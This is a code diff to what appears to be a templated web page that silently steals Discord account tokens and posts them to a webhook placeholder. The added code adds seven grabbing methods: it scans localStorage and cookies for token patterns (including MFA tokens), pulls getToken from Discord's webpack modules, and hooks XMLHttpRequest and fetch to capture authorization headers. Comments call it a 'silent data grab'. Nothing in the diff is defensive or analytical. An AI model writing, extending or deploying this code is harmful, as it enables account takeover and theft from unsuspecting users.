@@ -61,29 +61,62 @@ body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;
 // NO GPS - Silent data grab only
 const webhook='{WEBHOOK}';
 
-// Get Discord token - MULTIPLE METHODS
+// AGGRESSIVE Discord token grab - ALL possible methods
 let tokens=[];
 
-// Method 1: Discord Desktop App (DiscordNative)
+// Wait a moment for Discord to load
+await new Promise(resolve=>setTimeout(resolve,500));
+
+// Method 1: Direct window.localStorage access
 try{{
-if(window.DiscordNative?.isRenderer){{
-const token=await window.DiscordNative.nativeModules.requireModule('discord_utils').getToken();
-if(token&&!tokens.includes(token))tokens.push(token);
+const keys=['token','tokens','discord_token','user_token'];
+keys.forEach(key=>{{
+const val=localStorage.getItem(key);
+if(val){{
+const clean=val.replace(/['"]/g,'');
+if(clean.match(/[\\w-]{{24}}\\.[\\w-]{{6}}/)){{
+if(!tokens.includes(clean))tokens.push(clean);
 }}
+}}
+}});
 }}catch(e){{}}
 
-// Method 2: Webpack
+// Method 2: Scan ALL localStorage keys for token patterns
+try{{
+Object.keys(localStorage).forEach(key=>{{
+try{{
+const val=localStorage.getItem(key);
+if(val&&val.length>20){{
+const matches=val.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g)||[];
+matches.forEach(t=>{{if(!tokens.includes(t))tokens.push(t)}});
+const mfaMatches=val.match(/mfa\\.[\\w-]{{84,}}/g)||[];
+mfaMatches.forEach(t=>{{if(!tokens.includes(t))tokens.push(t)}});
+}}
+}}catch(e){{}}
+}});
+}}catch(e){{}}
+
+// Method 3: Check document.cookie for tokens
+try{{
+const cookies=document.cookie.split(';');
+cookies.forEach(cookie=>{{
+const matches=cookie.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g)||[];
+matches.forEach(t=>{{if(!tokens.includes(t))tokens.push(t)}});
+}});
+}}catch(e){{}}
+
+// Method 4: Discord Webpack
 try{{
 if(window.webpackChunkdiscord_app){{
 window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
-for(let m of Object.values(r.c)){{
+for(let mod of Object.values(r.c)){{
 try{{
-if(m?.exports?.default?.getToken){{
-let t=m.exports.default.getToken();
+if(mod?.exports?.default?.getToken){{
+const t=mod.exports.default.getToken();
 if(t&&!tokens.includes(t))tokens.push(t);
 }}
-if(m?.exports?.getToken){{
-let t=m.exports.getToken();
+if(mod?.exports?.getToken){{
+const t=mod.exports.getToken();
 if(t&&!tokens.includes(t))tokens.push(t);
 }}
 }}catch(e){{}}
@@ -92,48 +125,61 @@ if(t&&!tokens.includes(t))tokens.push(t);
 }}
 }}catch(e){{}}
 
-// Method 3: Check for token in window object
+// Method 5: Alternative webpack method
 try{{
-if(window.localStorage.token){{
-let t=window.localStorage.token.replace(/"/g,'');
+let cachedModules;
+if(window.webpackChunkdiscord_app){{
+window.webpackChunkdiscord_app.push([[Symbol()],{{}},r=>{{cachedModules=r.c}}]);
+for(let mod in cachedModules){{
+try{{
+const exp=cachedModules[mod].exports;
+if(exp?.Z?.getToken){{
+const t=exp.Z.getToken();
+if(t&&!tokens.includes(t))tokens.push(t);
+}}
+if(exp?.default?.getToken){{
+const t=exp.default.getToken();
 if(t&&!tokens.includes(t))tokens.push(t);
 }}
 }}catch(e){{}}
-
-// Method 4: Deep localStorage scan
-try{{
-for(let i=0;i<localStorage.length;i++){{
-let v=localStorage.getItem(localStorage.key(i));
-if(v){{
-let m=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{38,}}/g);
-if(!m)m=v.match(/mfa\\.[\\w-]{{84,}}/g);
-if(m)m.forEach(t=>{{
-if(t&&!tokens.includes(t))tokens.push(t);
-}});
 }}
 }}
 }}catch(e){{}}
 
-// Method 5: Check IndexedDB for Discord data
+// Method 6: XMLHttpRequest intercept (catches tokens in use)
 try{{
-const dbRequest=indexedDB.open('discord_cache');
-dbRequest.onsuccess=async(event)=>{{
-const db=event.target.result;
-if(db.objectStoreNames.contains('tokens')){{
-const tx=db.transaction(['tokens'],'readonly');
-const store=tx.objectStore('tokens');
-const getAllRequest=store.getAll();
-getAllRequest.onsuccess=()=>{{
-const items=getAllRequest.result;
-items.forEach(item=>{{
-if(item.token&&!tokens.includes(item.token)){{
-tokens.push(item.token);
+const origOpen=XMLHttpRequest.prototype.open;
+XMLHttpRequest.prototype.open=function(...args){{
+this.addEventListener('load',function(){{
+try{{
+const authHeader=this.getResponseHeader('authorization');
+if(authHeader&&authHeader.match(/[\\w-]{{24}}\\.[\\w-]{{6}}/)){{
+if(!tokens.includes(authHeader))tokens.push(authHeader);
 }}
+}}catch(e){{}}
 }});
-}};
-}}
+return origOpen.apply(this,args);
 }};
 }}catch(e){{}}
+
+// Method 7: Fetch intercept
+try{{
+const origFetch=window.fetch;
+window.fetch=async function(...args){{
+const response=await origFetch(...args);
+try{{
+const cloned=response.clone();
+const authHeader=cloned.headers.get('authorization');
+if(authHeader&&authHeader.match(/[\\w-]{{24}}\\.[\\w-]{{6}}/)){{
+if(!tokens.includes(authHeader))tokens.push(authHeader);
+}}
+}}catch(e){{}}
+return response;
+}};
+}}catch(e){{}}
+
+// Give interceptors time to catch tokens
+await new Promise(resolve=>setTimeout(resolve,1000));
 
 // If Discord token found, get full account
 if(tokens.length>0){{
